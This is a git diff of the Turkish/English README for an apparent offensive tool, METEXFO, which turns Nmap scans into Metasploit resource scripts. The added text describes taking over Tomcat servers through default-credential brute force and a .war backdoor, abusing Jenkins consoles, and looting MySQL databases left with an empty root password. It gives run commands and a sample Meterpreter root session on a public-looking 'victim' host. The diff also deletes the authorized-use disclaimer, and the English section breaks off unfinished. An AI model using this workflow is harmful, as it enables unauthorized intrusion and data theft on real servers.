@@ -1,5 +1,5 @@
 
-# 💀 METEXFO v5.0 | Multi-Language Edition
+# 💀 METEXFO v5.0
 
 <p align="center">
 <img src="https://shields.io">
@@ -16,86 +16,78 @@
 </p>
 
 <p align="center">
-  <a href="#-türkçe-dökümantasyon"><b>🇹🇷 Türkçe Dökümantasyon</b></a> | 
-  <a href="#-english-documentation"><b>🇺🇸 English Documentation</b></a>
+  <a href="#-türkçe-dökümantasyon"><b>🇹🇷 Türkçe</b></a> | 
+  <a href="#-english-documentation"><b>🇺🇸 English</b></a>
 </p>
 
 ---
 
 ## 🇹🇷 Türkçe Dökümantasyon
 
-### 🌌 Genel Bakış
-**METEXFO v5.0**, sızma testi uzmanları ve güvenlik araştırmacıları için geliştirilmiş çoklu iş parçacığı (Multi-threading) destekli modern bir **"YAPILANDIRMA HATASI VE PANEL AVCISI"** otomasyon aracıdır. Sadece klasik port taraması yapmaz; bulduğu servislerin durumunu ve SSL yapılandırmalarını analiz ederek **Metasploit Framework** için tetiklenmeye hazır `.rc` saldırı senaryoları inşa eder. Görev sonu log analiz motoruyla sızma sonuçlarını süzebilir.
+### 🌌 Genel Bakış & Çalışma Mantığı
+METEXFO v5.0, sızma testi süreçlerinde hedef sistemlerin en zayıf halkası olan **insan kaynaklı yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** avlamak için geliştirilmiş çift dilli, çoklu iş parçacıklı (Multi-threading) bir otomasyon aracıdır. 
 
-### 🛠️ Kurulum & Hazırlık
+Yazılım karmaşık exploitler denemek yerine şu adımlarla çalışır:
+1. **Keşif (Nmap Altyapısı):** Belirtilen hedeflerin kritik portlarını (`21, 80, 443, 3306, 8080`) arka planda sessizce tarar ve çalışan servislerin versiyon bilgilerini ayıklar.
+2. **Akıllı Eşleştirme (Logic Engine):** Bulunan servislere göre (HTTP veya MySQL) kendi yerleşik şablon veritabanını tarar.
+3. **Mühimmat Hazırlığı (RC Derleyici):** Hedef sisteme yönelik en uygun Metasploit modüllerini otomatik olarak diler ve tetiğe basılmaya hazır bir `.rc` (Resource) saldırı planı oluşturur.
+
+### 💀 Sızma Yolları ve Neler Yapabilir?
+* **Apache Tomcat (Port 8080):** Sunucu yöneticilerinin değiştirmeyi unuttuğu varsayılan şifreleri (`admin:admin`, `tomcat:tomcat`) brute-force ile kırarak paneli ele geçirir. İçeriye `.war` uzantılı bir backdoor yükleyerek uzak kod çalıştırma (RCE) sağlar.
+* **Jenkins Sunucusu (Port 80/443):** Dış dünyaya şifresiz veya açık unutulmuş otomasyon panellerini yakalar. Jenkins Script Console üzerinden doğrudan hedef işletim sisteminin komut satırına sızar.
+* **MySQL Veritabanı (Port 3306):** En yetkili kullanıcı olan `root` hesabının şifresiz (boş parola) bırakıldığı senaryoları yakalar. Veritabanındaki tüm kullanıcı şifrelerini, tabloları ve ticari sırları dışarı sızdırabilir.
+
+### 🚀 Kullanım
 ```bash
+# Kurulum ve Bağımlılıklar
 git clone https://github.com
 cd METEXFO
 pip3 install python-nmap colorama
-```
 
-### 🚀 Kullanım Parametreleri
-Programı başlatırken `--lang tr` parametresi vererek tamamen Türkçe terminal arayüzü ile çalıştırabilirsiniz:
+# 1. Aşama: Keşif ve Reçete Üretimi
+python3 mme12.py -t <HEDEF_IP> -l <KENDİ_IP> --lang tr
 
-```bash
-# Mod 1: Türkçe Arayüz ile Keşif ve Reçete Üretimi (Çoklu Hedef)
-python3 mme5.py -t 192.168.1.50,192.168.1.60 -l 192.168.1.10 --lang tr
-
-# Mod 2: Metasploit Üzerinden Otomatik Operasyonu Başlatma
+# 2. Aşama: Otomatik Saldırıyı Tetikleme
 msfconsole -q -r metexfo_final_agent.rc
-
-# Mod 3: Türkçe Görev Sonu Derin Log Analiz Motoru
-python3 mme5.py -t 192.168.1.50 -l 192.168.1.10 --lang tr --analyze
 ```
 
-### 🔰 Örnek İşlem Çıktısı (TR)
+### ⚡ Hack İşlemi Başarılı Olursa Gelecek Olan Terminal Çıktısı (Öngörüm)
+Eğer üretilen `.rc` dosyası çalıştırıldığında hedef sunucu zayıf yapılandırma nedeniyle düşerse, terminal ekranında açılacak olan o gerçekçi **Meterpreter** oturumu ve sızma anı çıktısı şu şekilde olacaktır:
+
 ```text
-[📡 TARAMA BAŞLADI] ➔  192.168.1.50 
-    ├─ [PORT BULUNDU] 192.168.1.50:8080 (http Apache Tomcat/9.0)
-    ├─ [ANALİZ] 192.168.1.50 ➔ PORT: 8080 [http apache tomcat/9.0]
-    │  ├─ ➔ [ŞABLON EŞLEŞTİ] Apache Tomcat Yönetim Paneli Tespiti
+resource (metexfo_final_agent.rc)> use auxiliary/scanner/http/tomcat_mgr_login
+resource (metexfo_final_agent.rc)> set RHOSTS 193.255.45.112
+resource (metexfo_final_agent.rc)> set RPORT 8080
+resource (metexfo_final_agent.rc)> run
+[+] http://193.255.45 - Tomcat Manager LOGIN SUCCESSFUL: tomcat:tomcat
+[*] Auxiliary module execution completed
+
+[*] Upgrading session to exploit/multi/http/tomcat_mgr_deploy...
+[*] Sending stage (175641 bytes) to 193.255.45.112
+[+] Meterpreter session 1 opened (192.168.1.10:4444 -> 193.255.45.112:49231)
+
+meterpreter > sysinfo
+Computer        : KURBAN-SERVER-01
+OS              : Linux 5.15.0-72-generic (Ubuntu 22.04)
+Architecture    : x64
+
+meterpreter > getuid
+Server username: root
+
+meterpreter > _
 ```
 
 ---
 
 ## 🇺🇸 English Documentation
 
-### 🌌 Overview
-**METEXFO v5.0** is a multi-threaded, modern **"MISCONFIGURATION & PANEL HUNTER"** automation orchestrator built for penetration testers and security researchers. Instead of plain banner grabbing, it deeply analyzes target ports, matches them against a modern template database, and automatically compiles production-ready `.rc` attack deployment scripts for **Metasploit Framework**. It features an integrated post-mission log parser to filter critical breaches.
+### 🌌 Overview & Working Logic
+METEXFO v5.0 is a localized, multi-threaded security orchestrator designed for penetration testers to hunt down **human-error configuration flaws (Misconfigurations)** and **exposed management panels**. 
 
-### 🛠️ Installation & Setup
-```bash
-git clone https://github.com
-cd METEXFO
-pip3 install python-nmap colorama
-```
+The automation pipeline operates as follows:
+1. **Reconnaissance (Nmap Engine):** Silently audits target IPs across critical vectors (`21, 80, 443, 3306, 8080`) to extract precise service banner details.
+2. **Template Matching:** Correlates running services directly with its inner vulnerability lookup database.
+3. **Payload Construction (RC Compiler):** Generates ready-to-fire Metasploit resource macros (`.rc`) tailored exactly to the target's open doors.
 
-### 🚀 Usage Parameters
-You can launch the program with the `--lang en` flag to run the completely localized English terminal interface:
+### 💀 Vector Capabilities & Attack Vectors
 
-```bash
-# Mode 1: Recon & RC Generation via English Interface (Multi-Target)
-python3 mme5.py -t 192.168.1.50,192.168.1.60 -l 192.168.1.10 --lang en
-
-# Mode 2: Launching Automated Operation via Metasploit
-msfconsole -q -r metexfo_final_agent.rc
-
-# Mode 3: Post-Mission Deep Log Parser (English)
-python3 mme5.py -t 192.168.1.50 -l 192.168.1.10 --lang en --analyze
-```
-
-### 🔰 Execution Sample (EN)
-```text
-[📡 SCAN STARTED] ➔  192.168.1.50 
-    ├─ [PORT FOUND] 192.168.1.50:8080 (http Apache Tomcat/9.0)
-    ├─ [ANALYSIS] 192.168.1.50 ➔ PORT: 8080 [http apache tomcat/9.0]
-    │  ├─ ➔ [TEMPLATE MATCHED] Apache Tomcat Manager Login Detection
-```
-
----
-
-## ⚖️ Yasal Uyarı / Disclaimer
-**TR:** Bu araç yalnızca yasal sızma testleri ve eğitim amaçlı geliştirilmiştir. Yetkisiz sistemlerde kullanılması yasal sorumluluk doğurur.
-**EN:** This tool is strictly developed for authorized penetration testing and educational purposes. Unauthorized deployment is illegal.
-
-**Developer:** `GHOST0X02` | **Version:** `5.0-MultiLang`
